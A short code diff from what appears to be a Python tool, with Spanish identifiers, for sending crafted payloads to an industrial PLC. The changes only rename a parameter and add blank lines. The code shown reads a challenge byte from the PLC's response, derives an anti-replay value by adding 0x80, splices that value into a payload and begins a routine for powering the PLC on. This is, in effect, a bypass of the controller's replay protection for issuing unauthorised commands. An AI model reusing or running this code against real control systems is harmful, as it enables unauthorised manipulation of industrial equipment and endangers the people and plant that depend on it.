@@ -58,16 +58,19 @@ def fEnviarPayload(pData, pSocket):
     print("\n  Se esperó 5 segundos y el PLC no respondió.")
     return None
 
-def fCalcularAntiReplay(data):
+
+def fCalcularAntiReplay(pData):
   """ Extrae el challenge y calcula el valor anti-replay. """
-  vChallenge = data.hex()[48:50]  # Extrae el byte del challenge
+  vChallenge = pData.hex()[48:50]  # Extrae el byte del challenge
   vAntiReplay = int(vChallenge, 16) + 0x80  # Suma 0x80
   return vAntiReplay
+
 
 def fModificarPayload(pPayload, pAntiReplay):
   """ Modifica el payload con el valor anti-replay calculado. """
   vAntiHex = hex(pAntiReplay)[2:].zfill(2)  # Asegurar formato hexadecimal de 2 caracteres
   return pPayload[:46] + vAntiHex[0] + pPayload[47:48] + vAntiHex[1] + pPayload[48:]
+
 
 def fEncenderPLC(pHost):
   vSocketPLC = fConectar(pHost)
